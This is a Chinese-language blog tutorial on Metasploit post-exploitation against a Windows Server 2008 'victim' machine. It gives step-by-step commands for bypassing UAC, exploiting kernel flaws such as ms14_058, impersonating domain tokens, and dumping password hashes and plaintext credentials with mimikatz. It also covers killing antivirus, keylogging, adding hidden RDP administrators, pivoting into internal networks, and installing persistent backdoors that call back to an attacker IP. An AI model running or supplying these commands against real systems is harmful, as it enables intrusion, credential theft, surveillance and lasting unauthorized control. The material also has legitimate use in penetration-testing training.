**前言**

当你在爱害者的机器上执行一些操作时，发现有一些操作被拒绝执行，为了获得受害机器的完全权限，你需要绕过限制，获取本来没有的一些权限，这些权限可以用来删除文件，查看私有信息，或者安装特殊程序，比如病毒。Metasploit有很多种后渗透方法，可以用于对目标机器的权限绕过，最终获取到系统权限。

环境要求：

1.攻击机：kali 

2.目标机：server2008

在已经获取到一个meterpreter shell后，假如session为1，且权限不是系统权限的前提下，使用以下列出的几种提权方法：

**一、绕过UAC进行提权**

本方法主要有以下3个模块。

[![img](http://www.nsoad.com/upload/20161207/d8960d48c186afa96cc8ffeabdaf53ca.png)](http://www.nsoad.com/upload/20161207/d8960d48c186afa96cc8ffeabdaf53ca.png)

上面这些模块的详细信息在metasploit里已有介绍，这里不再多说，主要说一下使用方法。以exploit/windows/local/bypassuac模块为例

该模块在windows 32位和64位下都有效。

```
use exploit/windows/local/bypassuac
set session 1
exploit
```

本模块执行成功后将会返回一个新的meterpreter shell，如下

[![img](http://www.nsoad.com/upload/20161207/9ad69bb243bb70074178646f78b4d091.png)](http://www.nsoad.com/upload/20161207/9ad69bb243bb70074178646f78b4d091.png)

模块执行成功后，执行getuid发现还是普通权限，不要失望，继续执行getsystem，再次查看权限，成功绕过UAC，且已经是系统权限了。

其他两个模块用法和上面一样，原理有所不同，执行成功后都会返回一个新的meterpreter shell，且都需要执行getsystem获取系统权限。如下图：

[![img](http://www.nsoad.com/upload/20161207/db5bbd1733aed4507c0c1b856ee37c9c.png)](http://www.nsoad.com/upload/20161207/db5bbd1733aed4507c0c1b856ee37c9c.png)

```
exploit/windows/local/bypassuac_injection
```

[![img](http://www.nsoad.com/upload/20161207/693d2c4a80669d5c581563ff50d89362.png)](http://www.nsoad.com/upload/20161207/693d2c4a80669d5c581563ff50d89362.png)

```
exploit/windows/local/bypassuac_vbs
```

**二、提高程序运行级别（runas）**

这种方法可以利用exploit/windows/local/ask模块，但是该模块实际上只是以高权限重启一个返回式shellcode,并没有绕过UAC，会触发系统UAC，受害机器有提示，提示用户是否要运行，如果用户选择“yes”，就可以程序返回一个高权限meterpreter shell(需要执行getsystem)。如下：

[![img](http://www.nsoad.com/upload/20161207/5bcddc50618a2531bcad1fa0d2223180.png)](http://www.nsoad.com/upload/20161207/5bcddc50618a2531bcad1fa0d2223180.png)

在受害机器上会弹出UAC，提示用户是否运行。如下：

[![img](http://www.nsoad.com/upload/20161207/63447b6929558fee7e5c7b8b15a30bbc.png)](http://www.nsoad.com/upload/20161207/63447b6929558fee7e5c7b8b15a30bbc.png)

**三、利用windows提权漏洞进行提权**

可以利用metasploit下已有的提权漏洞，如ms13_053,ms14_058,ms16_016,ms16_032等。下面以ms14_058为例。

```
msf > exploit/windows/local/ms14_058_track_popup_menu
msf exploit(ms14_058_track_popup_menu) > set session 1
msf exploit(ms14_058_track_popup_menu) > exploit
```

[![img](http://www.nsoad.com/upload/20161207/571aefa42496cb87882074c560ff7ac6.png)](http://www.nsoad.com/upload/20161207/571aefa42496cb87882074c560ff7ac6.png)

用windows提权漏洞提权时，会直接返回高权限meterpreter shell，不需要再执行getsystem命令。

需要说明的是：在实际测试时，如果出现目标机器确实有漏洞，但是提权没有成功时，请确认你的TARGET和PAYLOAD是否设置正确，64位的系统最好用64位的PAYLOAD

四、令牌假冒

　　在用户登录windows操作系统时，系统都会给用户分配一个令牌(Token)，当用户访问系统资源时都会使用这个令牌进行身份验证，功能类似于网站的session或者cookie。

msf提供了一个功能模块可以让我们假冒别人的令牌，实现身份切换，如果目标环境是域环境，刚好域管理员登录过我们已经有权限的终端，那么就可以假冒成域管理员的角色。

　　1.查看当前用户

[![image.png](https://image.3001.net/images/20181116/1542337940_5bee359414620.png)](https://image.3001.net/images/20181116/1542337940_5bee359414620.png)

　　图20

　　2.使用use incognito命令进入该模块

[![image.png](https://image.3001.net/images/20181116/1542337956_5bee35a48f162.png)](https://image.3001.net/images/20181116/1542337956_5bee35a48f162.png)

　　3.查看存在的令牌

　　命令：list_tokens-u

[![image.png](https://image.3001.net/images/20181116/1542337976_5bee35b887c71.png)](https://image.3001.net/images/20181116/1542337976_5bee35b887c71.png)

　　4.令牌假冒

　　命令：impersonate_token用户名

　　注意用户名的斜杠需要写两个。

[![image.png](https://image.3001.net/images/20181116/1542337996_5bee35ccbc37c.png)](https://image.3001.net/images/20181116/1542337996_5bee35ccbc37c.png)

　　5.查看是否成功切换身份

[![image.png](https://image.3001.net/images/20181116/1542338015_5bee35df8ae01.png)](https://image.3001.net/images/20181116/1542338015_5bee35df8ae01.png)

　　五、获取凭证

　　在内网环境中，一个管理员可能管理多台服务器，他使用的密码有可能相同或者有规律，如果能够得到密码或者hash，再尝试登录内网其它服务器，可能取得意想不到的效果。

　　1.使用meterpreter的run hashdump命令。

[![image.png](https://image.3001.net/images/20181116/1542350457_5bee6679900b4.png)](https://image.3001.net/images/20181116/1542350457_5bee6679900b4.png)

[![image.png](https://image.3001.net/images/20181116/1542350464_5bee668093c35.png)](https://image.3001.net/images/20181116/1542350464_5bee668093c35.png)

　　2.使用load mimikatz加载mimikatz模块，再使用help mimikatz查看支持的命令。

[![image.png](https://image.3001.net/images/20181116/1542350500_5bee66a4eedb7.png)](https://image.3001.net/images/20181116/1542350500_5bee66a4eedb7.png)

　　3.使用wdigest命令获取登录过的用户储存在内存里的明文密码。

[![image.png](https://image.3001.net/images/20181116/1542350522_5bee66ba58a3b.png)](https://image.3001.net/images/20181116/1542350522_5bee66ba58a3b.png)

　　六、操作文件系统

　　1.文件的基本操作

　　ls：列出当前路径下的所有文件和文件夹。

　　pwd 或 getwd：查看当前路径。

　　search：搜索文件，使用search -h查看帮助。

　　cat：查看文件内容，比如cat test.txt。

　　edit：编辑或者创建文件。和Linux系统的vm命令类似，同样适用于目标系统是windows的情况。

　　rm：删除文件。

　　cd：切换路径。

　　mkdir：创建文件夹。

　　rmdir：删除文件夹。

　　getlwd 或 lpwd：查看自己系统的当前路径。

　　lcd：切换自己当前系统的目录。

　　lls：显示自己当前系统的所有文件和文件夹。

　　2.文件的上传和下载

　　(1) upload

　　格式：upload本地文件路径目标文件路径

[![image.png](https://image.3001.net/images/20181116/1542350576_5bee66f0c451f.png)](https://image.3001.net/images/20181116/1542350576_5bee66f0c451f.png)

　　(2)download

　　格式：download 目标文件路径 本地文件路径

[![image.png](https://image.3001.net/images/20181116/1542350595_5bee670375bfc.png)](https://image.3001.net/images/20181116/1542350595_5bee670375bfc.png)

　　七、系统其它操作

　　1.关闭防病毒软件

　　run killav

　　run post/windows/manage/killav

　　2.操作远程桌面

　　run post/windows/manage/enable_rdp开启远程桌面

　　run post/windows/manage/enable_rdp username=test password=test添加远程桌面的用户(同时也会将该用户添加到管理员组)

　　3.截屏

　　screenshot

　　4.键盘记录

　　keyscan_start：开启键盘记录功能

　　keyscan_dump：显示捕捉到的键盘记录信息

　　keyscan_stop：停止键盘记录功能

[![image.png](https://image.3001.net/images/20181116/1542350631_5bee6727eed9a.png)](https://image.3001.net/images/20181116/1542350631_5bee6727eed9a.png)

　　5.执行程序

　　execute -h 查看使用方法

　　-H：创建一个隐藏进程

　　-a：传递给命令的参数

　　-i：跟进程进行交互

　　-m：从内存中执行

　　-t：使用当前伪造的线程令牌运行进程

　　-s：在给定会话中执行进程

　　例：execute -f c:/temp/hello.exe

　　八、端口转发和内网代理

　　1.portfwd

　　portfwd是meterpreter提供的端口转发功能，在meterpreter下使用portfwd -h命令查看该命令的参数。

[![image.png](https://image.3001.net/images/20181116/1542350678_5bee67566e4df.png)](https://image.3001.net/images/20181116/1542350678_5bee67566e4df.png)

　　常用参数：

　　-l：本地监听端口

　　-r：内网目标的ip

　　-p：内网目标的端口

[![image.png](https://image.3001.net/images/20181116/1542350702_5bee676ecdf27.png)](https://image.3001.net/images/20181116/1542350702_5bee676ecdf27.png)

　　上面命令执行之后，会将10.1.1.3的3389端口转发到本地的2222端口。

[![image.png](https://image.3001.net/images/20181116/1542350722_5bee6782403ce.png)](https://image.3001.net/images/20181116/1542350722_5bee6782403ce.png)

　　2.pivot

　　pivot是msf最常用的代理，可以让我们使用msf提供的扫描模块对内网进行探测。

　　(1)首先需要在msf的操作界面下添加一个路由表。

　　添加命令：route add 内网ip 子网掩码  session的id

　　打印命令：route print

[![image.png](https://image.3001.net/images/20181116/1542351165_5bee693d0642e.png)](https://image.3001.net/images/20181116/1542351165_5bee693d0642e.png)

　　路由添加成功之后就可以在msf里访问10.1.1.0/24这个网段。

　　(2)建立socks代理。

　　如果其它程序需要访问这个内网环境，就可以建立socks代理。

　　msf提供了3个模块用来做socks代理。

　　auxiliary/server/socks4a  

　　use auxiliary/server/socks5  

　　use auxiliary/server/socks_unc

　　以auxiliary/server/socks4a为例，查看需要设置的参数。

[![image.png](https://image.3001.net/images/20181116/1542351182_5bee694eeb4f2.png)](https://image.3001.net/images/20181116/1542351182_5bee694eeb4f2.png)

　　一共两个参数：

　　SRVHOST：监听的ip地址，默认为0.0.0.0，一般不需要更改。

　　SRVPORT：监听的端口，默认为1080。

　　直接运行run命令，就可以成功创建一个socks4代理隧道，在linux上可以配置proxychains使用，在windows可以配置Proxifier进行使用。

　　九、后门

　　Meterpreter的shell运行在内存中，目标重启就会失效，如果管理员给系统打上补丁，那么就没办法再次使用exploit获取权限，所以需要持久的后门对目标进行控制。

　　Msf提供了两种后门，一种是metsvc(通过服务启动)，一种是persistence(支持多种方式启动)。

　　1.metsvc

　　(1) 使用run metsvc -h查看帮助，一共有三个参数。

　　-A：安装后门后，自动启动exploit/multi/handler模块连接后门

　　-h：查看帮助

　　-r：删除后门

　　(2) 安装后门

　　命令：run metsvc

[![image.png](https://image.3001.net/images/20181116/1542351350_5bee69f666d76.png)](https://image.3001.net/images/20181116/1542351350_5bee69f666d76.png)

　　命令运行成功后会在C:WindowsTEMP目录下新建随机名称的文件夹，里面生成3个文件（metsvc.dll、metsvc-server.exe、metsvc.exe）。

[![image.png](https://image.3001.net/images/20181116/1542351372_5bee6a0c22910.png)](https://image.3001.net/images/20181116/1542351372_5bee6a0c22910.png)

　　同时会新建一个服务，显示名称为Meterpreter，服务名称为metsvc，启动类型为”自动”,绑定在31337端口。

[![image.png](https://image.3001.net/images/20181116/1542351450_5bee6a5a15646.png)](https://image.3001.net/images/20181116/1542351450_5bee6a5a15646.png)

　　(3) 连接后门

　　使用exploit/multi/handler模块，payload设置为windows/metsvc_bind_tcp，设置目标ip和绑定端口31337。

[![image.png](https://image.3001.net/images/20181116/1542351468_5bee6a6c5e4d7.png)](https://image.3001.net/images/20181116/1542351468_5bee6a6c5e4d7.png)

　　2.persistence

　　(1) 使用run persistence -h查看参数。

　　-A：安装后门后，自动启动exploit/multi/handler模块连接后门

　　-L：自启动脚本的路径，默认为%TEMP%

　　-P：需要使用的payload，默认为windows/meterpreter/reverse_tcp

　　-S：作为一个服务在系统启动时运行（需要SYSTEM权限）

　　-T：要使用的备用可执行模板

　　-U：用户登陆时运行

　　-X：系统启动时运行

　　-i：后门每隔多少秒尝试连接服务端

　　-p：服务端监听的端口

　　-r：服务端ip

　　(2) 生成后门

　　命令：run persistence -X -i 10 -r 192.168.1.9 -p 4444

[![image.png](https://image.3001.net/images/20181116/1542351509_5bee6a95a5c65.png)](https://image.3001.net/images/20181116/1542351509_5bee6a95a5c65.png)

　　(3) 连接后门

　　使用exploit/multi/handler模块，payload设置为windows/meterpreter/reverse_tcp，同时设置好服务端监听ip和端口。

[![image.png](https://image.3001.net/images/20181116/1542351527_5bee6aa7ca967.png)](https://image.3001.net/images/20181116/1542351527_5bee6aa7ca967.png)

本文作者：方方和圆圆

本文链接：https://www.cnblogs.com/diligenceday/p/11028462.html

版权声明：本作品采用知识共享署名-非商业性使用-禁止演绎 2.5 中国大陆[许可协议](https://www.cnblogs.com/diligenceday/p/11028462.html)进行许可。